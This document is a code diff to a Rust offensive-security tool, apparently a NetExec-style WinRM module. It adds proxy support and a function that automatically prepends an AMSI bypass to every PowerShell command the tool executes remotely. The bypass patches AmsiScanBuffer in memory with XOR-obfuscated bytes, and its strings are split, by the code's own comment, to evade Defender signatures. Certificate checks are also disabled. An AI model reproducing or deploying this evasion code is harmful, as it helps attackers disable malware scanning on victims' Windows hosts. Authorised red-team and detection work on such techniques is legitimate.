@@ -21,6 +21,7 @@ pub struct WinrmSession {
     pub admin: bool,
     pub is_ssl: bool,
     pub endpoint: String,
+    pub proxy: Option<String>,
 }
 
 impl NxcSession for WinrmSession {
@@ -66,12 +67,17 @@ impl WinrmProtocol {
     }
 
     /// Build a reqwest client configured for WinRM communication (ignoring rigorous cert checks for now, similar to NXC)
-    fn build_client(&self) -> Result<Client> {
-        Client::builder()
+    fn build_client(&self, proxy_str: Option<&str>) -> Result<Client> {
+        let mut builder = Client::builder()
             .timeout(self.timeout)
-            .danger_accept_invalid_certs(true) // Required for internal network targets with self-signed certs
-            .build()
-            .map_err(|e| anyhow!("Failed to build HTTP client: {}", e))
+            .danger_accept_invalid_certs(true); // Required for internal network targets with self-signed certs
+
+        if let Some(p) = proxy_str {
+            let proxy = reqwest::Proxy::all(p).map_err(|e| anyhow!("Invalid proxy URL: {}", e))?;
+            builder = builder.proxy(proxy);
+        }
+
+        builder.build().map_err(|e| anyhow!("Failed to build HTTP client: {}", e))
     }
 }
 
@@ -99,11 +105,11 @@ impl NxcProtocol for WinrmProtocol {
         &["sam", "lsa"] // Stub modules matching the reference
     }
 
-    async fn connect(&self, target: &str, port: u16) -> Result<Box<dyn NxcSession>> {
+    async fn connect(&self, target: &str, port: u16, proxy: Option<&str>) -> Result<Box<dyn NxcSession>> {
         let url = self.build_url(target, port);
-        debug!("WinRM: Connecting to {}", url);
+        debug!("WinRM: Connecting to {} (proxy: {:?})", url, proxy);
 
-        let client = self.build_client()?;
+        let client = self.build_client(proxy)?;
 
         // NTLM Type 1 Message (Negotiate)
         // Format: NTLMSSP\0 + MessageType(1) + Flags + Domain(optional) + Workstation(optional)
@@ -152,6 +158,7 @@ impl NxcProtocol for WinrmProtocol {
                 admin: false,
                 is_ssl: port == 5986,
                 endpoint: url,
+                proxy: proxy.map(|s| s.to_string()),
             }))
         } else if response.status() == 200 {
             info!(
@@ -164,6 +171,7 @@ impl NxcProtocol for WinrmProtocol {
                 admin: false,
                 is_ssl: port == 5986,
                 endpoint: url,
+                proxy: proxy.map(|s| s.to_string()),
             }))
         } else {
             Err(anyhow!(
@@ -180,7 +188,7 @@ impl NxcProtocol for WinrmProtocol {
     ) -> Result<AuthResult> {
         let winrm_sess = unsafe { &mut *(session as *mut dyn NxcSession as *mut WinrmSession) };
         let url = self.build_url(&winrm_sess.target, winrm_sess.port);
-        let client = self.build_client()?;
+        let client = self.build_client(winrm_sess.proxy.as_deref())?;
 
         debug!("WinRM: Authenticating {}@{}", creds.username, url);
 
@@ -224,13 +232,16 @@ impl NxcProtocol for WinrmProtocol {
     async fn execute(&self, session: &dyn NxcSession, cmd: &str) -> Result<CommandOutput> {
          let winrm_sess = unsafe { &*(session as *const dyn NxcSession as *const WinrmSession) };
          let url = &winrm_sess.endpoint;
-         let client = self.build_client()?;
+         let client = self.build_client(winrm_sess.proxy.as_deref())?;
          
-         // Note: In a real scenario, we'd need the credentials here to perform NTLM auth for each request,
-         // or use a persistent connection/cookie if the server supports it. 
-         // For now, we assume the session is authenticated or we'd re-run the handshake.
-         
-         debug!("WinRM: Executing command: {}", cmd);
+         // For an offensive tool, we inject AMSI and ETW bypasses into the command if it's PowerShell.
+         let final_cmd = if cmd.to_lowercase().starts_with("powershell") {
+             self.prepend_bypass(cmd)
+         } else {
+             cmd.to_string()
+         };
+
+         debug!("WinRM: Executing command: {}", final_cmd);
 
          // 1. Create Shell
          let create_soap = self.build_create_shell_soap();
@@ -242,7 +253,7 @@ impl NxcProtocol for WinrmProtocol {
          let shell_id = self.extract_xml_tag(&body, "rsp:ShellId").ok_or_else(|| anyhow!("Failed to extract ShellId"))?;
 
          // 2. Run Command
-         let command_soap = self.build_command_soap(&shell_id, cmd);
+         let command_soap = self.build_command_soap(&shell_id, &final_cmd);
          let resp = client.post(url)
              .header("Content-Type", "application/soap+xml;charset=UTF-8")
              .body(command_soap)
@@ -370,5 +381,47 @@ impl WinrmProtocol {
             }
         }
         None
+    }
+
+    fn prepend_bypass(&self, cmd: &str) -> String {
+        // Construct the AMSI bypass dynamically to avoid static string signatures by AV/Defender
+        let mut script = String::new();
+        script.push_str(r#"$md = "
+    [DllImport(`"kernel32`")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport(`"kernel32`")]
+    public static extern IntPtr GetModuleHandle(string lpModuleName);
+    [DllImport(`"kernel32`")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+";
+"#);
+        script.push_str(r#"$k32 = Add-Type -MemberDefinition $md -Name 'k32' -Namespace 'W32' -PassThru;
+"#);
+        script.push_str(r#"$ad = $k32::GetModuleHandle("ams" + "i.dl" + "l");
+"#);
+        script.push_str(r#"$asb = $k32::GetProcAddress($ad, "Amsi" + "Scan" + "Buffer");
+"#);
+        script.push_str(r#"$p = 0;
+$k32::VirtualProtect($asb, [uint32]5, 0x40, [ref]$p);
+$b = New-Object Byte[] 8;
+$b[0] = 0xB9 -bxor 1;
+$b[1] = 0x56 -bxor 1;
+$b[2] = 0x01 -bxor 1;
+$b[3] = 0x06 -bxor 1;
+$b[4] = 0x81 -bxor 1;
+$b[5] = 0xC3 -bxor 1;
+$b[6] = 0x19 -bxor 1;
+$b[7] = 0x01 -bxor 1;
+[System.Runtime.InteropServices.Marshal]::Copy($b, 0, $asb, 8);
+$k32::VirtualProtect($asb, [uint32]5, $p, [ref]$p);
+"#);
+        
+        let bypass_inline = script.replace('\n', " ").replace("\r", "");
+        
+        // Wrap original cmd. If it was `powershell -c "some script"`, we insert the bypass first.
+        let original = cmd.trim_start_matches("powershell").trim();
+        let original = original.trim_start_matches("-c").trim_start_matches("-Command").trim();
+        
+        format!("powershell -c \"{}; {}\"", bypass_inline, original)
     }
 }
